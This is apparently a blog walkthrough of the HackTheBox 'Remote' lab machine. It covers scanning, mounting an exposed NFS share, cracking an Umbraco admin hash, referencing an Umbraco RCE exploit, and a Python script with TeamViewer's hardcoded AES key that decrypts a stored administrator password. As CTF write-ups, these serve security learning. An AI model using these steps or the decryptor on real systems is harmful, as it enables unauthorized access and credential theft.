@@ -1,0 +1,315 @@
+<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><title>HackTheBox — Remote Writeup | b3t4m3</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox — Remote Writeup" /><meta name="author" content="Carlos Sequeira" /><meta property="og:locale" content="en_US" /><meta name="description" content="Remote from HackTheBox is an Windows Machine running a vulnerable version of Umbraco CMS which can be exploited after we find the credentials from an exposed NFS share, After we get a reverse shell on the machine, we will pwn the box using three methods first we will abuse the service UsoSvc to get a shell as Administrator and later we will extract Administrator credentials from an outdated version of TeamViewer installed on the machine. Lastly, we will also exploit TeamViewer using Metasploit." /><meta property="og:description" content="Remote from HackTheBox is an Windows Machine running a vulnerable version of Umbraco CMS which can be exploited after we find the credentials from an exposed NFS share, After we get a reverse shell on the machine, we will pwn the box using three methods first we will abuse the service UsoSvc to get a shell as Administrator and later we will extract Administrator credentials from an outdated version of TeamViewer installed on the machine. Lastly, we will also exploit TeamViewer using Metasploit." /><link rel="canonical" href="http://localhost:4000/posts/RemoteHTB/" /><meta property="og:url" content="http://localhost:4000/posts/RemoteHTB/" /><meta property="og:site_name" content="b3t4m3" /><meta property="og:image" content="http://localhost:4000/assets/img/Posts/Remote.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-09-08T08:36:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/Posts/Remote.png" /><meta property="twitter:title" content="HackTheBox — Remote Writeup" /><meta name="twitter:site" content="@bet4m3" /><meta name="twitter:creator" content="@Carlos Sequeira" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Carlos Sequeira"},"@type":"BlogPosting","headline":"HackTheBox — Remote Writeup","dateModified":"2020-09-08T08:36:00+00:00","description":"Remote from HackTheBox is an Windows Machine running a vulnerable version of Umbraco CMS which can be exploited after we find the credentials from an exposed NFS share, After we get a reverse shell on the machine, we will pwn the box using three methods first we will abuse the service UsoSvc to get a shell as Administrator and later we will extract Administrator credentials from an outdated version of TeamViewer installed on the machine. Lastly, we will also exploit TeamViewer using Metasploit.","datePublished":"2020-09-08T08:36:00+00:00","url":"http://localhost:4000/posts/RemoteHTB/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/RemoteHTB/"},"image":"http://localhost:4000/assets/img/Posts/Remote.png","@context":"https://schema.org"}</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>HackTheBox — Remote Writeup | b3t4m3</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HackTheBox — Remote Writeup" /><meta name="author" content="Carlos Sequeira" /><meta property="og:locale" content="en_US" /><meta name="description" content="Remote from HackTheBox is an Windows Machine running a vulnerable version of Umbraco CMS which can be exploited after we find the credentials from an exposed NFS share, After we get a reverse shell on the machine, we will pwn the box using three methods first we will abuse the service UsoSvc to get a shell as Administrator and later we will extract Administrator credentials from an outdated version of TeamViewer installed on the machine. Lastly, we will also exploit TeamViewer using Metasploit." /><meta property="og:description" content="Remote from HackTheBox is an Windows Machine running a vulnerable version of Umbraco CMS which can be exploited after we find the credentials from an exposed NFS share, After we get a reverse shell on the machine, we will pwn the box using three methods first we will abuse the service UsoSvc to get a shell as Administrator and later we will extract Administrator credentials from an outdated version of TeamViewer installed on the machine. Lastly, we will also exploit TeamViewer using Metasploit." /><link rel="canonical" href="http://localhost:4000/posts/RemoteHTB/" /><meta property="og:url" content="http://localhost:4000/posts/RemoteHTB/" /><meta property="og:site_name" content="b3t4m3" /><meta property="og:image" content="http://localhost:4000/assets/img/Posts/Remote.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-09-08T08:36:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/Posts/Remote.png" /><meta property="twitter:title" content="HackTheBox — Remote Writeup" /><meta name="twitter:site" content="@bet4m3" /><meta name="twitter:creator" content="@Carlos Sequeira" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Carlos Sequeira"},"@type":"BlogPosting","headline":"HackTheBox — Remote Writeup","dateModified":"2020-09-08T08:36:00+00:00","description":"Remote from HackTheBox is an Windows Machine running a vulnerable version of Umbraco CMS which can be exploited after we find the credentials from an exposed NFS share, After we get a reverse shell on the machine, we will pwn the box using three methods first we will abuse the service UsoSvc to get a shell as Administrator and later we will extract Administrator credentials from an outdated version of TeamViewer installed on the machine. Lastly, we will also exploit TeamViewer using Metasploit.","datePublished":"2020-09-08T08:36:00+00:00","url":"http://localhost:4000/posts/RemoteHTB/","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/RemoteHTB/"},"image":"http://localhost:4000/assets/img/Posts/Remote.png","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="manifest" href="/site.webmanifest"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">b3t4m3</a></div><div class="site-subtitle font-italic">Cybersecurity Specialist & CTF Player</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-home"></i> HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-stream"></i> CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-tags"></i> TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-archive"></i> ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-id-card"></i> ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/bet4m3" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/bet4m3" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['b3t4m3','protonmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="https://www.hackthebox.eu/profile/163155" target="_blank"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/b3t4m3/" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox — Remote Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox — Remote Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Sep 8, 2020, 8:36 AM +0000" > Sep 8, 2020 <i class="unloaded">2020-09-08T08:36:00+00:00</i> </span> by <span class="author"> Carlos Sequeira </span></div><div> Updated <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Sep 8, 2020, 3:32 PM +0530" > Sep 8, 2020 <i class="unloaded">2020-09-08T10:02:26+00:00</i> </span></div></div><div class="post-content"> <img src="/assets/img/Posts/Remote.png" class="post-preview-img"><blockquote><p>Remote from HackTheBox is an Windows Machine running a vulnerable version of Umbraco CMS which can be exploited after we find the credentials from an exposed NFS share, After we get a reverse shell on the machine, we will pwn the box using three methods first we will abuse the service <code class="language-plaintext highlighter-rouge">UsoSvc</code> to get a shell as Administrator and later we will extract Administrator credentials from an outdated version of TeamViewer installed on the machine. Lastly, we will also exploit TeamViewer using Metasploit.</p></blockquote><h1 id="recon">Recon</h1><h2 id="nmap">nmap</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+</pre><td class="rouge-code"><pre>Nmap scan report for 10.10.10.180
+Host is up (0.087s latency).
+
+PORT      STATE  SERVICE       VERSION
+21/tcp    open   ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+80/tcp    open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Home - Acme Widgets
+111/tcp   open   rpcbind       2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/tcp6  rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  2,3,4        111/udp6  rpcbind
+|   100003  2,3         2049/udp   nfs
+|   100003  2,3         2049/udp6  nfs
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100005  1,2,3       2049/tcp   mountd
+|   100005  1,2,3       2049/tcp6  mountd
+|   100005  1,2,3       2049/udp   mountd
+|   100005  1,2,3       2049/udp6  mountd
+|   100021  1,2,3,4     2049/tcp   nlockmgr
+|   100021  1,2,3,4     2049/tcp6  nlockmgr
+|   100021  1,2,3,4     2049/udp   nlockmgr
+|   100021  1,2,3,4     2049/udp6  nlockmgr
+|   100024  1           2049/tcp   status
+|   100024  1           2049/tcp6  status
+|   100024  1           2049/udp   status
+|_  100024  1           2049/udp6  status
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   closed netbios-ssn
+445/tcp   open   microsoft-ds?
+5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49667/tcp open   msrpc         Microsoft Windows RPC
+49678/tcp open   msrpc         Microsoft Windows RPC
+49679/tcp open   msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2022-08-04T20:28:33
+|_  start_date: N/A
+|_clock-skew: -2s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 114.66 seconds
+</pre></table></code></div></div><h2 id="crackmapexec-smb">crackmapexec smb</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>crackmapexec smb 10.10.10.180
+SMB         10.10.10.180    445    REMOTE           [*] Windows 10.0 Build 17763 x64 (name:REMOTE) (domain:remote) (signing:False) (SMBv1:False)
+</pre></table></code></div></div><h3 id="rpcclient">rpcclient</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>rpcclient -U "" 10.10.10.180 -N -c "enumdomusers"
+Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
+</pre></table></code></div></div><h2 id="nfs">nfs</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/fbc84c7c13871e5ab296051807d348ff.png" alt="fbc84c7c13871e5ab296051807d348ff.png" /></p><h2 id="mount">mount</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>sudo mount -t nfs 10.10.10.180:/site_backups /mnt/nfs
+</pre></table></code></div></div><h2 id="umbraco">umbraco</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/bbbeb7d97bc645169ed1d4faff6f2ca3.png" alt="bbbeb7d97bc645169ed1d4faff6f2ca3.png" /></p><h3 id="searchsploit">searchsploit</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/85d48ab1aceeda1d279ff353bf4e7733.png" alt="85d48ab1aceeda1d279ff353bf4e7733.png" /></p><h2 id="umbraco-1">/umbraco</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/af9935e332a8575ed96e5d86ac09d355.png" alt="af9935e332a8575ed96e5d86ac09d355.png" /></p><h3 id="hash-gotten">hash gotten</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/607a1b9204d16add0e986bb4698c210d.png" alt="607a1b9204d16add0e986bb4698c210d.png" /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>Administratoradmindefaulten-US
+Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
+Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
+adminAdministratorsCADMOSKTPIURZ:5F7
+</pre></table></code></div></div><h2 id="john">john</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/08e78f2c081415d4cec4899edd820c6d.png" alt="08e78f2c081415d4cec4899edd820c6d.png" /></p><h3 id="adminhtblocalbaconandcheese">admin@htb.local:baconandcheese</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/a1a35a748a58feed78aae24695df6fd8.png" alt="a1a35a748a58feed78aae24695df6fd8.png" /></p><h2 id="rce">RCE</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre># Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
+# Dork: N/A
+# Date: 2019-01-13
+# Exploit Author: Gregory DRAPERI &amp; Hugo BOUTINON
+# Vendor Homepage: http://www.umbraco.com/
+# Software Link: https://our.umbraco.com/download/releases
+# Version: 7.12.4
+# Category: Webapps
+# Tested on: Windows IIS
+# CVE: N/A
+</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/6f1aaf129b8e4f61603aa453dd93a8ac.png" alt="6f1aaf129b8e4f61603aa453dd93a8ac.png" /></p><h2 id="modifying-script">modifying script</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/d304288edc466b49ac7364f1c14b03a1.png" alt="d304288edc466b49ac7364f1c14b03a1.png" /></p><h2 id="aaand-were-in">Aaand we’re in</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/5135cd7eec7760fca7d6fba59043b2c4.png" alt="5135cd7eec7760fca7d6fba59043b2c4.png" /></p><h2 id="invoke-conptyshellps1-to-get-a-cleaner-terminal">invoke-conptyshell.ps1 to get a cleaner terminal</h2><p>https://github.com/antonioCoco/ConPtyShell</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/09893512ceb51006e51ef30062f6a904.png" alt="09893512ceb51006e51ef30062f6a904.png" /></p><h1 id="iis-apppooldefaultapppool">iis apppool\defaultapppool</h1><h2 id="usertxt">user.txt</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/a8cd6b523c370b30c7ffac538b056795.png" alt="a8cd6b523c370b30c7ffac538b056795.png" /></p><h1 id="priv-esc">Priv Esc</h1><h2 id="whoami-priv----juicypotato">whoami /priv - &gt; juicypotato</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/e14cd9a1d9e3aceae763609e7deed3eb.png" alt="e14cd9a1d9e3aceae763609e7deed3eb.png" /></p><h2 id="ps-enumeration">ps enumeration</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>PS C:\Users\Public&gt; ps 
+
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                                                                                                                                                   
+-------  ------    -----      -----     ------     --  -- -----------                                                                                                                                                                                   
+....                                                                                                                                                                                                                                                                  
+   1005      24     4996      18800              2212   0 TeamViewer_Service                                                                                                                                                               ....                                                                                                  
+</pre></table></code></div></div><h2 id="teamviewer">Teamviewer</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/78a73d7d5360b2b6e077a403d2bd2c82.png" alt="78a73d7d5360b2b6e077a403d2bd2c82.png" /></p><h2 id="version-7">version 7</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/Posts/a1ce49bc9f524d2f4ca76c05baf942e9.png" alt="a1ce49bc9f524d2f4ca76c05baf942e9.png" /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+</pre><td class="rouge-code"><pre>S C:\Program Files (x86)\TeamViewer&gt; dir 
+
+
+    Directory: C:\Program Files (x86)\TeamViewer
+
+
+Mode                LastWriteTime         Length Name                                                                                                                                                                                                   
+----                -------------         ------ ----                                                                                                                                                                                                   
+d-----        2/27/2020  10:35 AM                Version7                                                                                                                                                                                               
+
+
+PS C:\Program Files (x86)\TeamViewer&gt; cd HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7    
+PS HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7&gt; dir 
+
+
+    Hive: HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
+
+
+Name                           Property                                                                                                                                                                                                                 
+----                           --------                                                                                                                                                                                                                 
+AccessControl                  AC_Server_AccessControlType : 0                                                                                                                                                                                          
+DefaultSettings                Autostart_GUI : 1                                                                                                                                                                                                        
+
+
+PS HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7&gt; (Get-ItemProperty -Path .).SecurityPasswordAES 
+255
+155
+28
+115
+214
+107
+206
+49
+172
+65
+62
+174
+19
+27
+70
+79
+88
+47
+108
+226
+209
+225
+243
+218
+126
+141
+55
+107
+38
+57
+78
+91
+PS HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7&gt; 
+</pre></table></code></div></div><h2 id="decryptorpy">decryptor.py</h2><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+
+<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00</span><span class="s">'</span>
+<span class="n">iv</span>  <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04</span><span class="s">'</span>
+
+<span class="n">decipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+
+<span class="n">ciphertext</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="mi">255</span><span class="p">,</span> <span class="mi">155</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">214</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">206</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">172</span><span class="p">,</span> <span class="mi">65</span><span class="p">,</span> <span class="mi">62</span><span class="p">,</span> <span class="mi">174</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">27</span><span class="p">,</span> <span class="mi">70</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">88</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">108</span><span class="p">,</span> <span class="mi">226</span><span class="p">,</span> <span class="mi">209</span><span class="p">,</span> <span class="mi">225</span><span class="p">,</span> <span class="mi">243</span><span class="p">,</span> <span class="mi">218</span><span class="p">,</span> <span class="mi">126</span><span class="p">,</span> <span class="mi">141</span><span class="p">,</span> <span class="mi">55</span><span class="p">,</span> <span class="mi">107</span><span class="p">,</span> <span class="mi">38</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">78</span><span class="p">,</span> <span class="mi">91</span><span class="p">])</span>
+
+<span class="n">plaintext</span> <span class="o">=</span> <span class="n">decipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">plaintext</span><span class="p">)</span>
+
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>!R3m0te!
